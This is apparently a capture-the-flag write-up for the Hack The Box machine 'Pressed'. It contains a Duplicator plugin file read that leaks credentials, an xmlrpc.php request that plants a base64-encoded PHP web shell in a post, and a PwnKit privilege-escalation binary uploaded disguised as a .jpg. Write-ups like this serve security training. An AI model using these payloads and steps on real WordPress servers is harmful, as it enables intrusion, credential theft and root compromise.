---
created: 2025-09-19
---

📅 `2025-09-19`

#wordpress #xmlrpc #web-shell #polkit #pwnkit

----

## 🖥️ Box Info

| ️🏷️ Name         |  `Pressed`   |
| --------------- | --- |
| 📆 Release Date |  `2022-02-03`   |
| 🌐 IP Address   |  `10.10.11.142`   |
| 🖥️ OS           |   `Linux`  |
| 🎯 Difficulty   |  `Hard`   |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- Manual interaction with `WordPress`'s `xmlrpc.php`
- Create post via `xmlrpc.php` with `PHP` since `PHP Everywhere` plugin was installed
- Everything through a web shell
- `PolKit` `CVE` (`PwnKit`)

**🛠️ Tools:**  

- `Burp Suite`
- `wpscan`

**📚 Learned:**  

- `WordPress` `xmlrpc.php` manual interactions. Interactions include method listing and method calling for actions like uploading files or creating a post.
- `PHP Everywhere` plugin.
- Read an existing post for syntax reference.
- Enumerate firewall rules. Common ones are `iptables`, `ufw`, and `firewalld`.
- `PolKit` `CVE` (`PwnKit`). [This](https://github.com/ly4k/PwnKit) is the best exploit I found. It works over a web shell too.
- Privilege escalation even without an interactive shell (this machine only allowed a web shell).
- Pass binary as `base64` and upload through `xmlrpc.php`.

----

## 🌐 Port Scan

- **TCP**: 80

---

## 🔍 Enumeration

Only port 80 is open, hosting a `WordPress` web app. It had this post:

![[Pasted image 20250918161424.png]]

In the user agent table there is a `pressed.htb` domain. I added that to `/etc/hosts`.

I started with `wpscan`.

```shell
wpscan --url 'http://pressed.htb' --enumerate ap --plugins-detection mixed --api-token <REDACTED>
```

It found lots of things. I will investigate these plugins.

The vulnerabilities in the plugin `Duplicator` look interesting.

```
[+] duplicator
 | Location: http://10.10.11.142/wp-content/plugins/duplicator/
 | Last Updated: 2025-09-12T16:17:00.000Z
 | Readme: http://10.10.11.142/wp-content/plugins/duplicator/readme.txt
 | [!] The version is out of date, the latest version is 1.5.13.3
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.11.142/wp-content/plugins/duplicator/, status: 200
 |
 | [!] 6 vulnerabilities identified:
 |
 | [!] Title: Duplicator 1.3.24 & 1.3.26 - Unauthenticated Arbitrary File Download
 |     Fixed in: 1.3.28
 |     References:
 |      - https://wpscan.com/vulnerability/35227c3a-e893-4c68-8cb6-ffe79115fb6d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11738
 |      - https://www.exploit-db.com/exploits/49288/
 |      - https://www.wordfence.com/blog/2020/02/active-attack-on-recently-patched-duplicator-plugin-vulnerability-affects-over-1-million-sites/
 |      - https://snapcreek.com/duplicator/docs/changelog/?lite
 |      - https://snapcreek.com/duplicator/docs/changelog/
 |      - https://cxsecurity.com/issue/WLB-2021010001
 |
 | [!] Title: Duplicator < 1.4.7 - Unauthenticated Backup Download
 |     Fixed in: 1.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/f27d753e-861a-4d8d-9b9a-6c99a8a7ebe0
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-2551
 |      - https://github.com/SecuriTrust/CVEsLab/tree/main/CVE-2022-2551
 |      - https://packetstormsecurity.com/files/167896/
 |
 | [!] Title: Duplicator < 1.4.7.1 - Unauthenticated System Information Disclosure
 |     Fixed in: 1.4.7.1
 |     References:
 |      - https://wpscan.com/vulnerability/6b540712-fda5-4be6-ae4b-bd30a9d9d698
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-2552
 |      - https://github.com/SecuriTrust/CVEsLab/tree/main/CVE-2022-2552
 |      - https://packetstormsecurity.com/files/167895/
 |
 | [!] Title: Duplicator < 1.5.7.1; Duplicator Pro < 4.5.14.2 - Unauthenticated Sensitive Data Exposure
 |     Fixed in: 1.5.7.1
 |     References:
 |      - https://wpscan.com/vulnerability/5c5d41b9-1463-4a9b-862f-e9ee600ef8e1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6114
 |      - https://research.cleantalk.org/cve-2023-6114-duplicator-poc-exploit
 |
 | [!] Title: Duplicator < 1.5.7.1 - Settings Removal via CSRF
 |     Fixed in: 1.5.7.1
 |     References:
 |      - https://wpscan.com/vulnerability/c2aca72c-6aa5-4fda-966f-f4f045eda828
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-51681
 |      - https://patchstack.com/database/vulnerability/duplicator/wordpress-duplicator-plugin-1-5-7-cross-site-request-forgery-csrf-vulnerability
 |
 | [!] Title: Duplicator < 1.5.10 - Full Path Disclosure
 |     Fixed in: 1.5.10
 |     References:
 |      - https://wpscan.com/vulnerability/7026d0be-9e57-4ef4-84a2-f7122e36c0cd
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6210
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/d47d582d-7c90-4f49-aee1-03a8775b850d
 |
 | Version: 1.3.26 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.11.142/wp-content/plugins/duplicator/readme.txt
```

This vulnerability and exploit look particularly interesting:

```
| [!] Title: Duplicator 1.3.24 & 1.3.26 - Unauthenticated Arbitrary File Download
 |     Fixed in: 1.3.28
 |     References:
 |      - https://wpscan.com/vulnerability/35227c3a-e893-4c68-8cb6-ffe79115fb6d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11738
 |      - https://www.exploit-db.com/exploits/49288/
 |      - https://www.wordfence.com/blog/2020/02/active-attack-on-recently-patched-duplicator-plugin-vulnerability-affects-over-1-million-sites/
 |      - https://snapcreek.com/duplicator/docs/changelog/?lite
 |      - https://snapcreek.com/duplicator/docs/changelog/
 |      - https://cxsecurity.com/issue/WLB-2021010001
```

I went to the `exploit-db` `URL` and found this:

![[Pasted image 20250918190933.png]]

It's a `Metasploit` module. I quickly tried it with `msfconsole`.

```shell
msf > search duplicator

Matching Modules
================

   #  Name                                            Disclosure Date  Rank    Check  Description
   -  ----                                            ---------------  ----    -----  -----------
   0  exploit/multi/php/wp_duplicator_code_inject     2018-08-29       manual  Yes    Snap Creek Duplicator WordPress plugin code injection
   1  auxiliary/scanner/http/wp_duplicator_file_read  2020-02-19       normal  No     WordPress Duplicator File Read Vulnerability


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/wp_duplicator_file_read

msf > use 1
msf auxiliary(scanner/http/wp_duplicator_file_read) > options

Module options (auxiliary/scanner/http/wp_duplicator_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      5                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf auxiliary(scanner/http/wp_duplicator_file_read) > set RHOSTS pressed.htb
RHOSTS => pressed.htb
msf auxiliary(scanner/http/wp_duplicator_file_read) > run
[*] Downloading file...

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
htb:x:1000:1000:htb:/home/htb:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:109:118:MySQL Server,,,:/nonexistent:/bin/false
```

Got `LFI`.

I included `/var/www/html/wp-config.php` and found this:

```
<SNIP>
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'admin' );

/** Database password */
define( 'DB_PASSWORD', 'uhc-jan-finals-2022' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
<SNIP>
```

The server didn't have the database port open, so it must be listening only on `localhost`. I decided to try the credentials on the admin login and they worked! But I got this:

![[Pasted image 20250918191738.png]]

This has to be a plugin, so I checked the output of `wpscan` again.

Nothing stood out, so I enumerated `xmlrpc.php`.

![[Pasted image 20250918212159.png]]

This method `htb.get_flag` looks interesting. Let's execute it.

![[Pasted image 20250918221711.png]]

Got the user flag.

---

## 🪜 Foothold / User

From the output of `wpscan` we saw that the web app has the `PHP Everywhere` plugin installed. It allows `PHP` to be executed in posts. We can actually create and edit posts via `xmlrpc.php`. The syntax is as follows:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>metaWeblog.newPost</methodName>
  <params>
    <param><value><int>1</int></value></param> <!-- blog ID -->
    <param><value><string>admin</string></value></param> <!-- username -->
    <param><value><string>uhc-jan-finals-2022</string></value></param> <!-- password -->
    <param>
      <value>
        <struct>
          <member>
            <name>title</name>
            <value><string>Innocent Post</string></value>
          </member>
          <member>
            <name>description</name>
            <value>
            <string>
			Contents
			</string>
			</value>
          </member>
          <member>
            <name>post_status</name>
            <value><string>publish</string></value>
          </member>
        </struct>
      </value>
    </param>
    <param><value><boolean>1</boolean></value></param> <!-- publish flag -->
  </params>
</methodCall>
```

We can also read posts using `metaWeblog.getPost`. Here is the syntax:

```xml
<?xml version="1.0" encoding="utf-8"?>

<methodCall>
  <methodName>metaWeblog.getPost</methodName>
  <params>
    <param><value><int>1</int></value></param>  <!-- Post ID -->
    <param><value><string>admin</string></value></param> <!-- Username -->
    <param><value><string>uhc-jan-finals-2022</string></value></param> <!-- Password -->
  </params>
</methodCall>
```

>[!tip]
>We are bypassing the `2FA` requirement by executing actions via `xmlrpc.php` with the admin credentials.

I fetched the existing post to see if it uses `PHP Everywhere` and understand its syntax.

![[Pasted image 20250918222040.png]]

We can see that the tags are encoded. We need to encode them too for uploading, as this method outputs the file contents as they are.

The `base64` encoded `PHP` code translates to:

```php
<?php echo(file_get_contents('/var/www/html/output.log')); ?>
```

Let's create a malicious post. The title will be `Innocent Post`:

![[Pasted image 20250918222310.png]]

```xml
<?xml version="1.0" encoding="UTF-8"?>

<methodCall>
  <methodName>metaWeblog.newPost</methodName>
  <params>
    <param><value><int>1</int></value></param> <!-- blog ID -->
    <param><value><string>admin</string></value></param> <!-- username -->
    <param><value><string>uhc-jan-finals-2022</string></value></param> <!-- password -->
    <param>
      <value>
        <struct>
          <member>
            <name>title</name>
            <value><string>Innocent Post</string></value>
          </member>
          <member>
            <name>description</name>
            <value><string>
&lt;!-- wp:php-everywhere-block/php {&quot;code&quot;:&quot;PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&quot;,&quot;version&quot;:&quot;3.0.0&quot;} /--&gt;</string></value>
          </member>
          <member>
            <name>post_status</name>
            <value><string>publish</string></value>
          </member>
        </struct>
      </value>
    </param>
    <param><value><boolean>1</boolean></value></param> <!-- publish flag -->
  </params>
</methodCall>
```

And navigate to it:

![[Pasted image 20250918222321.png]]

![[Pasted image 20250918222348.png]]

I tried passing commands through `?cmd=<command>`.

![[Pasted image 20250918222421.png]]

And we got `RCE`. Next, I tried to get a reverse shell with `bash` payloads and with my `PHP` reverse shell in another post, but none of them worked.

---

## 🛡️ Privilege Escalation

With command execution, I deactivated the `2FA` plugin:

![[Pasted image 20250919004243.png]]

I just renamed its folder:

![[Pasted image 20250919004309.png]]

And now log in as admin:

![[Pasted image 20250919004323.png]]

I tried getting a reverse shell but it didn't work. I suspected a firewall and found `iptables` enabled in `systemctl`. This was the configuration:

```
# Generated by iptables-save v1.8.4 on Mon Jan 31 23:19:19 2022 *filter :INPUT DROP [0:0] :FORWARD ACCEPT [0:0] :OUTPUT DROP [0:0] -A INPUT -p tcp -m tcp &#8211;dport 80 -j ACCEPT -A INPUT -p icmp -m icmp &#8211;icmp-type 8 -j ACCEPT -A INPUT -i lo -j ACCEPT -A OUTPUT -p icmp -m icmp &#8211;icmp-type 0 -j ACCEPT -A OUTPUT -p tcp -m state &#8211;state RELATED,ESTABLISHED -j ACCEPT -A OUTPUT -o lo -j ACCEPT COMMIT # Completed on Mon Jan 31 23:19:19 2022
```

The server only accepts inbound connections on port 80 and drops all other traffic, including every new outbound connection, so reverse shells can't get out.

After a long session of enumeration I found that the `Polkit` version was old and vulnerable to `PwnKit`. [This exploit](https://github.com/ly4k/PwnKit) works without an interactive shell. I compiled it, encoded it as `base64`, and uploaded it using `xmlrpc.php`.

```shell
$ command cat PwnKit | base64 -w0
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAARMAAAAAAABAAAAAAAAAAHg9AAAAAAAAAAAAAEAAOAANAEAAJAAjAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA2AIAAAAAAADYAgAAAAAAAAgAAAAAAAAAAwAAAAQAAACgIQAAAAAAAKAhAAAAAAAAoCEAAAAAAAAcAAAAAAAAABwAAAAAAAAAEAAAAAAAAAABAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAMAAAAAAAAQAwAAAAAAAAAEAAAAAAAAAEAAAAFAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAsQcAAAAAAACxBwAAAAAAAAAQAAAAAAAAAQAAAAQAAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAAAADUAgAAAAAAANQCAAAAAAAAABAAAAAAAAABAAAABgAAAAguAAAAAAAACD4AAAAAAAAIPgAAAAAAAOgCAAAAAAAA8AIAAAAAAAAAEAAAAAAAAAIAAAAGAAAAGC4AAAAAAAAYPgAAAAAAABg+AAAAAAAAwAEAAAAAAADAAQAAAAAAAAgAAAAAAAAABAAAAAQAAAAYAwAAAAAAABgDAAAAAAAAGAMAAAAAAAAwAAAAAAAAADAAAAAAAAAACAAAAAAAAAAEAAAABAAAAEgDAAAAAAAASAMAAAAAAABIAwAAAAAAACQAAAAAAAAAJAAAAAAAAAAEAAAAAAAAAFPldGQEAAAAGAMAAAAAAAAYAwAAAAAAABgDAAAAAAAAMAAAAAAAAAAwAAAAAAAAAAgAAAAAAAAAUOV0ZAQA...
```

I uploaded it as a `.jpg` file because of the extension allowlist.

![[Pasted image 20250919101220.png]]

The file name is `example3.jpg`. We have the path in the upload response.

I decided to use my web shell handler for the `chmod +x ...` to avoid manually `URL` encoding in `Burp Suite`.

```shell
RCE> chmod +x /var/www/html/wp-content/uploads/2025/09/example3.jpg
```

Then execute it. The syntax is `pwnkit <command>`:

![[Pasted image 20250919101536.png]]

Got `RCE` as `root`.

Getting the `root` flag was harder, because the exploit was written in a way that only allows a single-word command:

```c
execve("/bin/sh", (char *[]){"/bin/cat", cmd, NULL}, NULL);
```

>[!tip]
>I could have rewritten the exploit to accept multi-word commands, but hardcoding the command and recompiling was quicker.

I just added the command to read the root flag instead of the `cmd`:

```c
execve("/bin/sh", (char *[]){"/bin/cat", "/root/root.txt", NULL}, NULL);
```

This was inside this `if` statement:

```c
if (cmd) {
        execve("/bin/sh", (char *[]){"/bin/cat", "/root/root.txt", NULL}, NULL);
    } else {
        // Try interactive bash first
        execve("/bin/bash", (char *[]){"-i", NULL}, NULL);

        // In case interactive bash was not possible
        execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL);
    }
    _exit(0);
```

In the code above, the `cmd` value is only set if we pass an argument to the command, meaning that to execute the `cat /root/root.txt` I needed to pass an argument. I recompiled this version and uploaded it as `example4.jpg`:

![[Pasted image 20250919103250.png]]

Now I `chmod +x ...` it and run it. I had to pass a random argument for it to work because of the `if` statement:

![[Pasted image 20250919103335.png]]

Rooted.
